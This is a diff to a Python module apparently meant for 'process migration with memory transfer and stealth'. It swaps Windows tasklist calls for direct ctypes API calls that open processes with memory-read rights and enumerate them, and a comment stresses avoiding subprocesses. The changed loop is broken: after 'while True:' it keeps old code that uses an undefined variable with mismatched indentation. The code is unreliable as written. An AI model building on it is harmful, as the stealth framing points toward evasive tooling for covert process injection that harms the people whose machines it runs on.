@@ -7,7 +7,7 @@ Advanced process migration with memory transfer and stealth
 import os
 import sys
 import ctypes
-import subprocess
+# subprocess removed - using native APIs only
 import tempfile
 from typing import Dict, Any, List
 
@@ -525,19 +525,49 @@ def _get_windows_process_details(pid: int) -> Dict[str, Any]:
     details = {}
     
     try:
-        # Use tasklist for detailed info
-        result = subprocess.run(['tasklist', '/fi', f'PID eq {pid}', '/fo', 'csv', '/v'], 
-                              capture_output=True, text=True, timeout=10)
+        # Use native Windows API to get process details
+        import ctypes
+        from ctypes import wintypes
         
-        if result.returncode == 0:
-            lines = result.stdout.strip().split('\n')
-            if len(lines) > 1:
-                headers = [h.strip('"') for h in lines[0].split('","')]
-                values = [v.strip('"') for v in lines[1].split('","')]
-                
-                for i, header in enumerate(headers):
-                    if i < len(values):
-                        details[header.lower().replace(' ', '_')] = values[i]
+        kernel32 = ctypes.windll.kernel32
+        
+        # Open process with query rights
+        PROCESS_QUERY_INFORMATION = 0x0400
+        PROCESS_VM_READ = 0x0010
+        
+        process_handle = kernel32.OpenProcess(
+            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 
+            False, 
+            pid
+        )
+        
+        if process_handle:
+            # Get process name
+            exe_path = ctypes.create_unicode_buffer(260)
+            size = wintypes.DWORD(260)
+            if kernel32.QueryFullProcessImageNameW(process_handle, 0, exe_path, ctypes.byref(size)):
+                details['image_name'] = os.path.basename(exe_path.value)
+                details['path'] = exe_path.value
+            
+            # Get process times
+            creation_time = ctypes.c_ulonglong()
+            exit_time = ctypes.c_ulonglong()
+            kernel_time = ctypes.c_ulonglong()
+            user_time = ctypes.c_ulonglong()
+            
+            if kernel32.GetProcessTimes(
+                process_handle,
+                ctypes.byref(creation_time),
+                ctypes.byref(exit_time),
+                ctypes.byref(kernel_time),
+                ctypes.byref(user_time)
+            ):
+                details['creation_time'] = creation_time.value
+                details['kernel_time'] = kernel_time.value
+                details['user_time'] = user_time.value
+            
+            details['pid'] = str(pid)
+            kernel32.CloseHandle(process_handle)
                         
     except Exception:
         pass
@@ -576,17 +606,40 @@ def _get_unix_process_details(pid: int) -> Dict[str, Any]:
     return details
 
 def _get_windows_processes() -> List[Dict[str, Any]]:
-    """Get Windows process list"""
+    """Get Windows process list using native API - NO SUBPROCESS"""
     
     processes = []
     
     try:
-        result = subprocess.run(['tasklist', '/fo', 'csv'], capture_output=True, text=True, timeout=10)
-        if result.returncode == 0:
-            lines = result.stdout.strip().split('\n')
-            if len(lines) > 1:
-                for line in lines[1:]:  # Skip header
-                    if line.strip():
+        import ctypes
+        from ctypes import wintypes
+        
+        kernel32 = ctypes.windll.kernel32
+        
+        # Use CreateToolhelp32Snapshot
+        TH32CS_SNAPPROCESS = 0x00000002
+        
+        class PROCESSENTRY32(ctypes.Structure):
+            _fields_ = [
+                ("dwSize", wintypes.DWORD),
+                ("cntUsage", wintypes.DWORD),
+                ("th32ProcessID", wintypes.DWORD),
+                ("th32DefaultHeapID", ctypes.POINTER(wintypes.ULONG)),
+                ("th32ModuleID", wintypes.DWORD),
+                ("cntThreads", wintypes.DWORD),
+                ("th32ParentProcessID", wintypes.DWORD),
+                ("pcPriClassBase", wintypes.LONG),
+                ("dwFlags", wintypes.DWORD),
+                ("szExeFile", wintypes.CHAR * 260)
+            ]
+        
+        snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+        if snapshot != -1:
+            pe32 = PROCESSENTRY32()
+            pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)
+            
+            if kernel32.Process32First(snapshot, ctypes.byref(pe32)):
+                while True:
                         parts = [p.strip('"') for p in line.split('","')]
                         if len(parts) >= 2:
                             try:
